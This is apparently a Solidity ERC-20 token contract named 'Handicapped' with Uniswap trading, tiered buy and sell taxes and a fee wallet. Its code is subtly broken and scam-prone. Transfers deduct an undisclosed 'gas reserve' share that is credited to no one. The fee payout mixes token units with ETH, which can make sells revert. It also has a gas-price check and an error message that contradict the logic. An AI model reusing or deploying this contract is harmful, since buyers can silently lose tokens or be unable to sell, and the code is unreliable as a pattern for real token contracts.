contract Handicapped is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private _name = "Handicapped";
    string private _symbol = "HANDICAP";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 69420911 * 10**uint256(_decimals);
    address payable private _taxWallet = payable(0xa8f2Bfc50ec74d5e0A6baa00fb48e7fa79C41b67);

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _buyerMap;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    bool public transferDelayEnabled = false;

    uint256 private _initialBuyTax = 5;
    uint256 private _initialSellTax = 6;
    uint256 private _finalBuyTax = 2;
    uint256 private _finalSellTax = 2;
    uint256 private _reduceBuyTaxAt = 25;
    uint256 private _reduceSellTaxAt = 50;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;

    uint256 public _maxTxAmount = _totalSupply;
    uint256 public _maxWalletSize = _totalSupply;
    uint256 public _taxSwapThreshold = 0;
    uint256 public _maxTaxSwap = 1;

    uint256 private _gasReserve; // New variable for gas reserve
    uint256 private _gasReservePercentage = 5; // Example: 5% of tax goes to gas reserve

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _totalSupply;
        _allowances[_msgSender()][address(this)] = _totalSupply;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        uint256 gasReserveAmount = 0;

        if (from != owner() && to != owner()) {

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed.");
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if (_buyCount < _preventSwapBefore) {
                    require(!isContract(to));
                }
                _buyCount++;
                _buyerMap[to] = true;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(_buyCount > _preventSwapBefore || _buyerMap[from], "Seller is not buyer");
            }

            if (_buyCount > _reduceBuyTaxAt) {
                taxAmount = amount.mul(_finalBuyTax).div(100);
            } else {
                taxAmount = amount.mul(_initialBuyTax).div(100);
            }

            if (to == uniswapV2Pair && from != address(this)) {
                if (_buyCount > _reduceSellTaxAt) {
                    taxAmount = amount.mul(_finalSellTax).div(100);
                } else {
                    taxAmount = amount.mul(_initialSellTax).div(100);
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                gasReserveAmount = amount.mul(_gasReservePercentage).div(100);
                _gasReserve = _gasReserve.add(gasReserveAmount);

                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(contractETHBalance);
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount).sub(gasReserveAmount));
        emit Transfer(from, to, amount.sub(taxAmount).sub(gasReserveAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) {
            return;
        }
        if (!tradingOpen) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uint256 initialBalance = address(this).balance;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 ethReceived = address(this).balance.sub(initialBalance);
        if (ethReceived > 0) {
            sendETHToFee(ethReceived);
        }
    }

    function sendETHToFee(uint256 amount) private {
        require(tx.gasprice <= amount, "Gas price is too high");
        uint256 totalAmount = amount.add(_gasReserve);
        _taxWallet.transfer(totalAmount);
        _gasReserve = 0; // Reset gas reserve after sending
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    // Setter function for gas reserve percentage
    function setGasReservePercentage(uint256 percentage) external onlyOwner() {
        require(percentage <= 25, "Percentage must be 100 or less");
        _gasReservePercentage = percentage;
    }

    // Getter function for gas reserve amount
    function gasReserve() external view returns (uint256) {
        return _gasReserve;
    }
}
